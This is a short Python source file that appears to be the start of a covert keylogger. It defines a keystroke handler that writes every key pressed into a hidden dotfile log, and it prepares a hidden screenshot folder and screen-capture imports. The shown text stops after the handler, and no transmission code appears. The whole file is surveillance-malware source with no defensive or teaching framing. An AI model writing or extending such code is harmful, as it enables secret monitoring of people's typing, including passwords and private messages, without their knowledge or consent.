import os
import threading
import time
import platform
import psutil
from pynput import keyboard
from mss import mss

log_file = os.path.expanduser("~/.hidden_keylog.log")
screenshot_dir = os.path.expanduser("~/.screenshots")
#Function to capture keystrokes
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"Key Pressed: {key.char}\n")
            elif key == keyboard.Key.space:
                f.write("Key Pressed: Space\n")
            elif key == keyboard.Key.enter:
                f.write("Key Pressed: Enter\n")
            elif key == keyboard.Key.backspace:
                f.write("Key Pressed: Backspace\n")
            elif key == keyboard.Key.shift:
                f.write("Key Pressed: Shift\n")
            elif key == keyboard.Key.caps_lock:
                f.write("Key Pressed: Caps Lock\n")
            elif key == keyboard.Key.tab:
                f.write("Key Pressed: Tab\n")
            else:
                f.write(f"Key Pressed: {key}\n")  # For other special keys
    except Exception as e:
        pass

